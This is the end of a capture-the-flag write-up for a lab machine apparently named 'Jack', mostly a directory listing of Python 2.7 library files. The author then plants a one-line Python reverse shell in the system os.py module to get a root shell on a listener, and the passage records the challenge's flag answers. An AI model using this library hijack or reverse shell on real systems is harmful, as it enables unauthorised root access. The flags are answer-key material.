+/usr/lib/python2.7/macpath.pyc
+/usr/lib/python2.7/telnetlib.py
+/usr/lib/python2.7/anydbm.pyc
+/usr/lib/python2.7/posixfile.py
+/usr/lib/python2.7/htmlentitydefs.pyc
+/usr/lib/python2.7/collections.pyc
+/usr/lib/python2.7/modulefinder.py
+/usr/lib/python2.7/inspect.pyc
+/usr/lib/python2.7/SimpleXMLRPCServer.pyc
+/usr/lib/python2.7/dircache.py
+/usr/lib/python2.7/_pyio.py
+/usr/lib/python2.7/Cookie.py
+/usr/lib/python2.7/pipes.py
+/usr/lib/python2.7/rlcompleter.pyc
+/usr/lib/python2.7/SocketServer.py
+/usr/lib/python2.7/tempfile.py
+/usr/lib/python2.7/smtpd.py
+/usr/lib/python2.7/uuid.py
+/usr/lib/python2.7/repr.pyc
+/usr/lib/python2.7/webbrowser.pyc
+/usr/lib/python2.7/multifile.pyc
+/usr/lib/python2.7/rfc822.pyc
+/usr/lib/python2.7/xdrlib.py
+/usr/lib/python2.7/ssl.pyc
+/usr/lib/python2.7/symtable.py
+/usr/lib/python2.7/test
+/usr/lib/python2.7/csv.py
+/usr/lib/python2.7/sunaudio.py
+/usr/lib/python2.7/distutils
+/usr/lib/python2.7/base64.py
+/usr/lib/python2.7/wave.pyc
+/usr/lib/python2.7/UserString.py
+/usr/lib/python2.7/pdb.py
+/usr/lib/python2.7/mimify.pyc
+/usr/lib/python2.7/locale.py
+/usr/lib/python2.7/formatter.py
+/usr/lib/python2.7/compileall.pyc
+/usr/lib/python2.7/binhex.py
+/usr/lib/python2.7/urllib2.pyc
+/usr/lib/python2.7/re.pyc
+/usr/lib/python2.7/whichdb.py
+/usr/lib/python2.7/xml
+/usr/lib/python2.7/markupbase.py
+/usr/lib/python2.7/codeop.pyc
+/usr/lib/python2.7/commands.pyc
+/usr/lib/python2.7/cProfile.pyc
+/usr/lib/python2.7/bsddb
+/usr/lib/python2.7/pty.pyc
+/usr/lib/python2.7/dis.py
+/usr/lib/python2.7/uuid.pyc
+/usr/lib/python2.7/sre_constants.py
+/usr/lib/python2.7/ftplib.pyc
+/usr/lib/python2.7/sre_parse.pyc
+/usr/lib/python2.7/stringold.py
+/usr/lib/python2.7/UserDict.pyc
+/usr/lib/python2.7/imputil.py
+/usr/lib/python2.7/sndhdr.py
+/usr/lib/python2.7/fractions.py
+/usr/lib/python2.7/copy.pyc
+/usr/lib/python2.7/trace.pyc
+/usr/lib/python2.7/pkgutil.pyc
+/usr/lib/python2.7/functools.py
+/usr/lib/python2.7/weakref.pyc
+/usr/lib/python2.7/Cookie.pyc
+/usr/lib/python2.7/runpy.pyc
+/usr/lib/python2.7/tarfile.py
+/usr/lib/python2.7/pickletools.py
+/usr/lib/python2.7/BaseHTTPServer.pyc
+/usr/lib/python2.7/sunau.pyc
+/usr/lib/python2.7/os2emxpath.pyc
+/usr/lib/python2.7/calendar.pyc
+/usr/lib/python2.7/Queue.py
+/usr/lib/python2.7/symbol.py
+/usr/lib/python2.7/sha.pyc
+/usr/lib/python2.7/warnings.pyc
+/usr/lib/python2.7/htmllib.pyc
+/usr/lib/python2.7/argparse.egg-info
+/usr/lib/python2.7/whichdb.pyc
+/usr/lib/python2.7/sre_compile.py
+/usr/lib/python2.7/asynchat.py
+/usr/lib/python2.7/pdb.pyc
+/usr/lib/python2.7/mutex.pyc
+/usr/lib/python2.7/anydbm.py
+/usr/lib/python2.7/stat.pyc
+/usr/lib/python2.7/imputil.pyc
+/usr/lib/python2.7/__phello__.foo.pyc
+/usr/lib/python2.7/sre_constants.pyc
+/usr/lib/python2.7/ntpath.pyc
+/usr/lib/python2.7/ensurepip
+/usr/lib/python2.7/uu.pyc
+/usr/lib/python2.7/_LWPCookieJar.py
+/usr/lib/python2.7/sre.pyc
+/usr/lib/python2.7/nturl2path.py
+/usr/lib/python2.7/StringIO.py
+/usr/lib/python2.7/warnings.py
+/usr/lib/python2.7/user.py
+/usr/lib/python2.7/compileall.py
+/usr/lib/python2.7/htmllib.py
+/usr/lib/python2.7/platform.py
+/usr/lib/python2.7/pydoc.py
+/usr/lib/python2.7/DocXMLRPCServer.py
+/usr/lib/python2.7/cmd.pyc
+/usr/lib/python2.7/socket.pyc
+/usr/lib/python2.7/ftplib.py
+/usr/lib/python2.7/plat-x86_64-linux-gnu
+/usr/lib/python2.7/_sysconfigdata.py
+/usr/lib/python2.7/LICENSE.txt
+/usr/lib/python2.7/mutex.py
+/usr/lib/python2.7/argparse.pyc
+/usr/lib/python2.7/filecmp.pyc
+/usr/lib/python2.7/string.pyc
+/usr/lib/python2.7/tty.py
+/usr/lib/python2.7/platform.pyc
+/usr/lib/python2.7/ctypes
+/usr/lib/python2.7/os2emxpath.py
+/usr/lib/python2.7/toaiff.py
+/usr/lib/python2.7/calendar.py
+/usr/lib/python2.7/pickletools.pyc
+/usr/lib/python2.7/filecmp.py
+/usr/lib/python2.7/repr.py
+/usr/lib/python2.7/textwrap.pyc
+/usr/lib/python2.7/markupbase.pyc
+/usr/lib/python2.7/mimetools.py
+/usr/lib/python2.7/re.py
+/usr/lib/python2.7/shelve.py
+/usr/lib/python2.7/smtplib.pyc
+/usr/lib/python2.7/runpy.py
+/usr/lib/python2.7/new.py
+/usr/lib/python2.7/sets.py
+/usr/lib/python2.7/hmac.pyc
+/usr/lib/python2.7/hashlib.pyc
+/usr/lib/python2.7/mimetypes.py
+/usr/lib/python2.7/wsgiref
+/usr/lib/python2.7/tabnanny.py
+/usr/lib/python2.7/formatter.pyc
+/usr/lib/python2.7/struct.py
+/usr/lib/python2.7/urllib2.py
+/usr/lib/python2.7/antigravity.py
+/usr/lib/python2.7/HTMLParser.py
+/usr/lib/python2.7/wave.py
+/usr/lib/python2.7/linecache.py
+/usr/lib/python2.7/sysconfig.py
+/usr/lib/python2.7/_abcoll.pyc
+/usr/lib/python2.7/asynchat.pyc
+/usr/lib/python2.7/HTMLParser.pyc
+/usr/lib/python2.7/audiodev.py
+/usr/lib/python2.7/wsgiref.egg-info
+/usr/lib/python2.7/mailbox.py
+/usr/lib/python2.7/pprint.py
+/usr/lib/python2.7/getopt.pyc
+/usr/lib/python2.7/_weakrefset.py
+/usr/lib/python2.7/xdrlib.pyc
+/usr/lib/python2.7/asyncore.pyc
+/usr/lib/python2.7/BaseHTTPServer.py
+/usr/lib/python2.7/code.py
+/usr/lib/python2.7/rexec.py
+/usr/lib/python2.7/statvfs.py
+/usr/lib/python2.7/_threading_local.pyc
+/usr/lib/python2.7/genericpath.pyc
+/usr/lib/python2.7/shutil.pyc
+/usr/lib/python2.7/abc.py
+/usr/lib/python2.7/keyword.pyc
+/usr/lib/python2.7/dist-packages
+/usr/lib/python2.7/mhlib.pyc
+/usr/lib/python2.7/site.py
+/usr/lib/python2.7/ntpath.py
+/usr/lib/python2.7/dbhash.py
+/usr/lib/python2.7/binhex.pyc
+/usr/lib/python2.7/uu.py
+/usr/lib/python2.7/types.py
+/usr/lib/python2.7/sets.pyc
+/usr/lib/python2.7/sched.py
+/usr/lib/python2.7/atexit.pyc
+/usr/lib/python2.7/sunaudio.pyc
+/usr/lib/python2.7/netrc.pyc
+/usr/lib/python2.7/dumbdbm.pyc
+/usr/lib/python2.7/dumbdbm.py
+/usr/lib/python2.7/code.pyc
+/usr/lib/python2.7/sunau.py
+/usr/lib/python2.7/nturl2path.pyc
+/usr/lib/python2.7/lib-dynload
+/usr/lib/python2.7/mailcap.pyc
+/usr/lib/python2.7/gzip.py
+/usr/lib/python2.7/token.py
+/usr/lib/python2.7/cgi.py
+/usr/lib/python2.7/pprint.pyc
+/usr/lib/python2.7/rexec.pyc
+/usr/lib/python2.7/nntplib.py
+/usr/lib/python2.7/logging
+/usr/lib/python2.7/tokenize.pyc
+/usr/lib/python2.7/cgitb.pyc
+/usr/lib/python2.7/user.pyc
+/usr/lib/python2.7/tty.pyc
+/usr/lib/python2.7/new.pyc
+/usr/lib/python2.7/SimpleHTTPServer.py
+/usr/lib/python2.7/encodings
+/usr/lib/python2.7/CGIHTTPServer.py
+/usr/lib/python2.7/threading.py
+/usr/lib/python2.7/chunk.py
+/usr/lib/python2.7/gettext.py
+/usr/lib/python2.7/stringprep.pyc
+/usr/lib/python2.7/robotparser.py
+/usr/lib/python2.7/pipes.pyc
+/usr/lib/python2.7/linecache.pyc
+/usr/lib/python2.7/fnmatch.pyc
+/usr/lib/python2.7/ssl.py
+/usr/lib/python2.7/importlib
+/usr/lib/python2.7/macurl2path.py
+/usr/lib/python2.7/genericpath.py
+/usr/lib/python2.7/textwrap.py
+/usr/lib/python2.7/fileinput.py
+/usr/lib/python2.7/multiprocessing
+/usr/lib/python2.7/mimify.py
+/usr/lib/python2.7/pstats.py
+/usr/lib/python2.7/ConfigParser.py
+/usr/lib/python2.7/pickle.pyc
+/usr/lib/python2.7/cgitb.py
+/usr/lib/python2.7/timeit.py
+/usr/lib/python2.7/sched.pyc
+/usr/lib/python2.7/bisect.py
+/usr/lib/python2.7/abc.pyc
+/usr/lib/python2.7/heapq.pyc
+/usr/lib/python2.7/pdb.doc
+/usr/lib/python2.7/aifc.py
+/usr/lib/python2.7/__future__.py
+/usr/lib/python2.7/socket.py
+/usr/lib/python2.7/glob.py
+/usr/lib/python2.7/tabnanny.pyc
+/usr/lib/python2.7/modulefinder.pyc
+/usr/lib/python2.7/shlex.pyc
+/usr/lib/python2.7/io.pyc
+/usr/lib/python2.7/sgmllib.py
+/usr/lib/python2.7/mimetools.pyc
+/usr/lib/python2.7/dummy_thread.py
+/usr/lib/python2.7/traceback.py
+/usr/lib/python2.7/__future__.pyc
+/usr/lib/python2.7/py_compile.pyc
+/usr/lib/python2.7/CGIHTTPServer.pyc
+/usr/lib/python2.7/decimal.py
+/usr/lib/python2.7/pickle.py
+/usr/lib/python2.7/httplib.pyc
+/usr/lib/python2.7/curses
+/usr/lib/python2.7/numbers.pyc
+/usr/lib/python2.7/md5.pyc
+/usr/lib/python2.7/symtable.pyc
+/usr/lib/python2.7/imaplib.py
+/usr/lib/python2.7/atexit.py
+/usr/lib/python2.7/numbers.py
+/usr/lib/python2.7/imghdr.py
+/usr/lib/python2.7/SimpleXMLRPCServer.py
+/usr/lib/python2.7/hashlib.py
+/usr/lib/python2.7/colorsys.py
+/usr/lib/python2.7/copy.py
+/usr/lib/python2.7/mailcap.py
+/usr/lib/python2.7/nntplib.pyc
+/usr/lib/python2.7/pydoc.pyc
+/usr/lib/python2.7/csv.pyc
+/usr/lib/python2.7/macpath.py
+/usr/lib/python2.7/py_compile.py
+/usr/lib/python2.7/rfc822.py
+/usr/lib/python2.7/imaplib.pyc
+/usr/lib/python2.7/quopri.py
+/usr/lib/python2.7/contextlib.pyc
+/usr/lib/python2.7/md5.py
+/usr/lib/python2.7/UserList.pyc
+/usr/lib/python2.7/stat.py
+/usr/lib/python2.7/pyclbr.py
+/usr/lib/python2.7/profile.pyc
+/usr/lib/python2.7/xmllib.pyc
+/usr/lib/python2.7/_abcoll.py
+/usr/lib/python2.7/profile.py
+/usr/lib/python2.7/xmlrpclib.py
+/usr/lib/python2.7/audiodev.pyc
+/usr/lib/python2.7/urlparse.pyc
+/usr/lib/python2.7/_weakrefset.pyc
+/usr/lib/python2.7/UserString.pyc
+/usr/lib/python2.7/subprocess.pyc
+/usr/lib/python2.7/functools.pyc
+/usr/lib/python2.7/urllib.pyc
+/usr/lib/python2.7/UserDict.py
+/usr/lib/python2.7/subprocess.py
+/usr/lib/python2.7/difflib.pyc
+/usr/lib/python2.7/commands.py
+/usr/lib/python2.7/htmlentitydefs.py
+/usr/lib/python2.7/zipfile.py
+/usr/lib/python2.7/poplib.py
+/usr/lib/python2.7/sysconfig.pyc
+/usr/lib/python2.7/xmlrpclib.pyc
+/usr/lib/python2.7/json
+/usr/lib/python2.7/pyclbr.pyc
+/usr/lib/python2.7/dummy_threading.pyc
+/usr/lib/python2.7/MimeWriter.py
+/usr/lib/python2.7/MimeWriter.pyc
+/usr/lib/python2.7/robotparser.pyc
+/usr/lib/python2.7/dummy_threading.py
+/usr/lib/python2.7/lib-tk
+/usr/lib/python2.7/shlex.py
+/usr/lib/python2.7/SimpleHTTPServer.pyc
+/usr/lib/python2.7/inspect.py
+/usr/lib/python2.7/decimal.pyc
+/usr/lib/python2.7/symbol.pyc
+/usr/lib/python2.7/base64.pyc
+/usr/lib/python2.7/keyword.py
+/usr/lib/python2.7/dummy_thread.pyc
+/usr/lib/python2.7/dis.pyc
+/usr/lib/python2.7/_LWPCookieJar.pyc
+/usr/lib/python2.7/locale.pyc
+/usr/lib/python2.7/trace.py
+/usr/lib/python2.7/io.py
+/usr/lib/python2.7/_MozillaCookieJar.py
+/usr/lib/python2.7/_strptime.py
+/usr/lib/python2.7/fractions.pyc
+/usr/lib/python2.7/compiler
+/usr/lib/python2.7/getpass.py
+/usr/lib/python2.7/gzip.pyc
+/usr/lib/python2.7/sndhdr.pyc
+/usr/lib/python2.7/random.pyc
+/usr/lib/python2.7/lib2to3
+/usr/lib/python2.7/collections.py
+/usr/lib/python2.7/codecs.py
+/usr/lib/python2.7/tempfile.pyc
+/usr/lib/python2.7/webbrowser.py
+/usr/lib/python2.7/popen2.pyc
+/usr/lib/python2.7/urlparse.py
+/usr/lib/python2.7/opcode.py
+/usr/lib/python2.7/dbhash.pyc
+/usr/lib/python2.7/optparse.pyc
+/usr/lib/python2.7/fileinput.pyc
+/usr/lib/python2.7/fpformat.pyc
+/usr/lib/python2.7/gettext.pyc
+/usr/lib/python2.7/toaiff.pyc
+/usr/lib/python2.7/rlcompleter.py
+/usr/lib/python2.7/sre.py
+/usr/lib/python2.7/codecs.pyc
+/usr/lib/python2.7/this.pyc
+/usr/lib/python2.7/unittest
+/usr/lib/python2.7/sre_compile.pyc
+/usr/lib/python2.7/types.pyc
+/usr/lib/python2.7/optparse.py
+/usr/lib/python2.7/mhlib.py
+/usr/lib/python2.7/cProfile.py
+/usr/lib/python2.7/ast.pyc
+/usr/lib/python2.7/UserList.py
+/usr/lib/python2.7/cookielib.py
+/usr/lib/python2.7/SocketServer.pyc
+/usr/lib/python2.7/aifc.pyc
+/usr/lib/python2.7/sha.py
+/usr/lib/python2.7/pstats.pyc
+/usr/lib/python2.7/ast.py
+/usr/lib/python2.7/ihooks.py
+/usr/lib/python2.7/stringold.pyc
+/usr/lib/python2.7/token.pyc
+/usr/lib/python2.7/copy_reg.pyc
+/usr/lib/python2.7/telnetlib.pyc
+/usr/lib/python2.7/pydoc_data
+/usr/lib/python2.7/__phello__.foo.py
+/usr/lib/python2.7/xmllib.py
+/usr/lib/python2.7/bdb.pyc
+/usr/lib/python2.7/ConfigParser.pyc
+/usr/lib/python2.7/chunk.pyc
+/usr/lib/python2.7/StringIO.pyc
+/usr/lib/python2.7/site.pyc
+/usr/lib/python2.7/_strptime.pyc
+/usr/lib/python2.7/this.py
+/usr/lib/python2.7/imghdr.pyc
+/usr/lib/python2.7/mailbox.pyc
+/usr/lib/python2.7/email
+/usr/lib/python2.7/random.py
+/usr/lib/python2.7/doctest.py
+/usr/lib/python2.7/antigravity.pyc
+/usr/lib/python2.7/Queue.pyc
+/usr/lib/python2.7/string.py
+/usr/lib/python2.7/pkgutil.py
+/usr/lib/python2.7/colorsys.pyc
+/usr/lib/python2.7/Bastion.py
+/usr/lib/python2.7/_MozillaCookieJar.pyc
+/usr/lib/python2.7/netrc.py
+/usr/lib/python2.7/tokenize.py
+/usr/lib/python2.7/urllib.py
+/usr/lib/python2.7/getopt.py
+/usr/lib/python2.7/poplib.pyc
+/usr/lib/python2.7/_osx_support.py
+/usr/lib/python2.7/cgi.pyc
+/usr/lib/python2.7/difflib.py
+/usr/lib/python2.7/statvfs.pyc
+/usr/lib/python2.7/macurl2path.pyc
+/usr/lib/python2.7/glob.pyc
+/usr/lib/python2.7/opcode.pyc
+/usr/lib/python2.7/quopri.pyc
+/usr/lib/python2.7/sqlite3
+/usr/lib/python2.7/argparse.py
+/usr/lib/python2.7/httplib.py
+/usr/lib/python2.7/DocXMLRPCServer.pyc
+/usr/lib/python2.7/tarfile.pyc
+/usr/lib/python2.7/sre_parse.py
+/usr/lib/python2.7/timeit.pyc
+/usr/lib/python2.7/mimetypes.pyc
+/usr/lib/python2.7/sitecustomize.pyc
+/usr/lib/python2.7/_pyio.pyc
+/usr/lib/python2.7/shelve.pyc
+/usr/lib/python2.7/_osx_support.pyc
+/usr/lib/python2.7/multifile.py
+/usr/lib/python2.7/threading.pyc
+/usr/lib/python2.7/cookielib.pyc
+/usr/lib/python2.7/codeop.py
+/usr/lib/python2.7/traceback.pyc
+/usr/lib/python2.7/asyncore.py
+/usr/lib/python2.7/popen2.py
+/usr/lib/python2.7/zipfile.pyc
+/usr/lib/python2.7/doctest.pyc
+/usr/lib/python2.7/getpass.pyc
+/usr/lib/python2.7/smtplib.py
+/etc/python2.7/sitecustomize.py
+
+jack@jack:/opt/statuscheck$ cd /usr/lib/python2.7/
+jack@jack:/usr/lib/python2.7$ ls
+_abcoll.py          dis.py               macpath.py             py_compile.py           sunaudio.pyc
+_abcoll.pyc         dis.pyc              macpath.pyc            py_compile.pyc          sunau.py
+abc.py              dist-packages        macurl2path.py         pydoc_data              sunau.pyc
+abc.pyc             distutils            macurl2path.pyc        pydoc.py                symbol.py
+aifc.py             doctest.py           mailbox.py             pydoc.pyc               symbol.pyc
+aifc.pyc            doctest.pyc          mailbox.pyc            _pyio.py                symtable.py
+antigravity.py      DocXMLRPCServer.py   mailcap.py             _pyio.pyc               symtable.pyc
+antigravity.pyc     DocXMLRPCServer.pyc  mailcap.pyc            Queue.py                _sysconfigdata.py
+anydbm.py           dumbdbm.py           markupbase.py          Queue.pyc               _sysconfigdata.pyc
+anydbm.pyc          dumbdbm.pyc          markupbase.pyc         quopri.py               sysconfig.py
+argparse.egg-info   dummy_threading.py   md5.py                 quopri.pyc              sysconfig.pyc
+argparse.py         dummy_threading.pyc  md5.pyc                random.py               tabnanny.py
+argparse.pyc        dummy_thread.py      mhlib.py               random.pyc              tabnanny.pyc
+ast.py              dummy_thread.pyc     mhlib.pyc              repr.py                 tarfile.py
+ast.pyc             email                mimetools.py           repr.pyc                tarfile.pyc
+asynchat.py         encodings            mimetools.pyc          re.py                   telnetlib.py
+asynchat.pyc        ensurepip            mimetypes.py           re.pyc                  telnetlib.pyc
+asyncore.py         filecmp.py           mimetypes.pyc          rexec.py                tempfile.py
+asyncore.pyc        filecmp.pyc          MimeWriter.py          rexec.pyc               tempfile.pyc
+atexit.py           fileinput.py         MimeWriter.pyc         rfc822.py               test
+atexit.pyc          fileinput.pyc        mimify.py              rfc822.pyc              textwrap.py
+audiodev.py         fnmatch.py           mimify.pyc             rlcompleter.py          textwrap.pyc
+audiodev.pyc        fnmatch.pyc          modulefinder.py        rlcompleter.pyc         this.py
+base64.py           formatter.py         modulefinder.pyc       robotparser.py          this.pyc
+base64.pyc          formatter.pyc        _MozillaCookieJar.py   robotparser.pyc         _threading_local.py
+BaseHTTPServer.py   fpformat.py          _MozillaCookieJar.pyc  runpy.py                _threading_local.pyc
+BaseHTTPServer.pyc  fpformat.pyc         multifile.py           runpy.pyc               threading.py
+Bastion.py          fractions.py         multifile.pyc          sched.py                threading.pyc
+Bastion.pyc         fractions.pyc        multiprocessing        sched.pyc               timeit.py
+bdb.py              ftplib.py            mutex.py               sets.py                 timeit.pyc
+bdb.pyc             ftplib.pyc           mutex.pyc              sets.pyc                toaiff.py
+binhex.py           functools.py         netrc.py               sgmllib.py              toaiff.pyc
+binhex.pyc          functools.pyc        netrc.pyc              sgmllib.pyc             tokenize.py
+bisect.py           __future__.py        new.py                 sha.py                  tokenize.pyc
+bisect.pyc          __future__.pyc       new.pyc                sha.pyc                 token.py
+bsddb               genericpath.py       nntplib.py             shelve.py               token.pyc
+calendar.py         genericpath.pyc      nntplib.pyc            shelve.pyc              traceback.py
+calendar.pyc        getopt.py            ntpath.py              shlex.py                traceback.pyc
+CGIHTTPServer.py    getopt.pyc           ntpath.pyc             shlex.pyc               trace.py
+CGIHTTPServer.pyc   getpass.py           nturl2path.py          shutil.py               trace.pyc
+cgi.py              getpass.pyc          nturl2path.pyc         shutil.pyc              tty.py
+cgi.pyc             gettext.py           numbers.py             SimpleHTTPServer.py     tty.pyc
+cgitb.py            gettext.pyc          numbers.pyc            SimpleHTTPServer.pyc    types.py
+cgitb.pyc           glob.py              opcode.py              SimpleXMLRPCServer.py   types.pyc
+chunk.py            glob.pyc             opcode.pyc             SimpleXMLRPCServer.pyc  unittest
+chunk.pyc           gzip.py              optparse.py            sitecustomize.py        urllib2.py
+cmd.py              gzip.pyc             optparse.pyc           sitecustomize.pyc       urllib2.pyc
+cmd.pyc             hashlib.py           os2emxpath.py          site.py                 urllib.py
+codecs.py           hashlib.pyc          os2emxpath.pyc         site.pyc                urllib.pyc
+codecs.pyc          heapq.py             os.py                  smtpd.py                urlparse.py
+codeop.py           heapq.pyc            os.pyc                 smtpd.pyc               urlparse.pyc
+codeop.pyc          hmac.py              _osx_support.py        smtplib.py              UserDict.py
+code.py             hmac.pyc             _osx_support.pyc       smtplib.pyc             UserDict.pyc
+code.pyc            hotshot              pdb.doc                sndhdr.py               UserList.py
+collections.py      htmlentitydefs.py    pdb.py                 sndhdr.pyc              UserList.pyc
+collections.pyc     htmlentitydefs.pyc   pdb.pyc                socket.py               user.py
+colorsys.py         htmllib.py           __phello__.foo.py      socket.pyc              user.pyc
+colorsys.pyc        htmllib.pyc          __phello__.foo.pyc     SocketServer.py         UserString.py
+commands.py         HTMLParser.py        pickle.py              SocketServer.pyc        UserString.pyc
+commands.pyc        HTMLParser.pyc       pickle.pyc             sqlite3                 uuid.py
+compileall.py       httplib.py           pickletools.py         sre_compile.py          uuid.pyc
+compileall.pyc      httplib.pyc          pickletools.pyc        sre_compile.pyc         uu.py
+compiler            ihooks.py            pipes.py               sre_constants.py        uu.pyc
+ConfigParser.py     ihooks.pyc           pipes.pyc              sre_constants.pyc       warnings.py
+ConfigParser.pyc    imaplib.py           pkgutil.py             sre_parse.py            warnings.pyc
+contextlib.py       imaplib.pyc          pkgutil.pyc            sre_parse.pyc           wave.py
+contextlib.pyc      imghdr.py            platform.py            sre.py                  wave.pyc
+cookielib.py        imghdr.pyc           platform.pyc           sre.pyc                 weakref.py
+cookielib.pyc       importlib            plat-x86_64-linux-gnu  ssl.py                  weakref.pyc
+Cookie.py           imputil.py           plistlib.py            ssl.pyc                 _weakrefset.py
+Cookie.pyc          imputil.pyc          plistlib.pyc           stat.py                 _weakrefset.pyc
+copy.py             inspect.py           popen2.py              stat.pyc                webbrowser.py
+copy.pyc            inspect.pyc          popen2.pyc             statvfs.py              webbrowser.pyc
+copy_reg.py         io.py                poplib.py              statvfs.pyc             whichdb.py
+copy_reg.pyc        io.pyc               poplib.pyc             StringIO.py             whichdb.pyc
+cProfile.py         json                 posixfile.py           StringIO.pyc            wsgiref
+cProfile.pyc        keyword.py           posixfile.pyc          stringold.py            wsgiref.egg-info
+csv.py              keyword.pyc          posixpath.py           stringold.pyc           xdrlib.py
+csv.pyc             lib2to3              posixpath.pyc          stringprep.py           xdrlib.pyc
+ctypes              lib-dynload          pprint.py              stringprep.pyc          xml
+curses              lib-tk               pprint.pyc             string.py               xmllib.py
+dbhash.py           LICENSE.txt          profile.py             string.pyc              xmllib.pyc
+dbhash.pyc          linecache.py         profile.pyc            _strptime.py            xmlrpclib.py
+decimal.py          linecache.pyc        pstats.py              _strptime.pyc           xmlrpclib.pyc
+decimal.pyc         locale.py            pstats.pyc             struct.py               zipfile.py
+difflib.py          locale.pyc           pty.py                 struct.pyc              zipfile.pyc
+difflib.pyc         logging              pty.pyc                subprocess.py
+dircache.py         _LWPCookieJar.py     pyclbr.py              subprocess.pyc
+dircache.pyc        _LWPCookieJar.pyc    pyclbr.pyc             sunaudio.py
+
+jack@jack:/usr/lib/python2.7$ nano os.py
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
+```
+```rb
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lvnp 1337                                     
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.12.106.
+Ncat: Connection from 10.10.12.106:44780.
+root@jack:~# cd /root
+cd /root
+root@jack:~# ls
+ls
+root.txt
+root@jack:~# cat root.txt
+cat root.txt
+b8b63a861cc09e853f29d8055d64bffb
+```
+![[Pasted image 20230118143030.png]]
+Gain initial access and obtain the user flag.
+Wpscan user enumeration, and don't use tools (ure_other_roles)
+*0052f7829e48752f2e7bf50f1231548a*
+Escalate your privileges to root. Whats the root flag?
+Python
+*b8b63a861cc09e853f29d8055d64bffb*
+
+## Notes / Lessons Learned
+[[Sigma]]
+
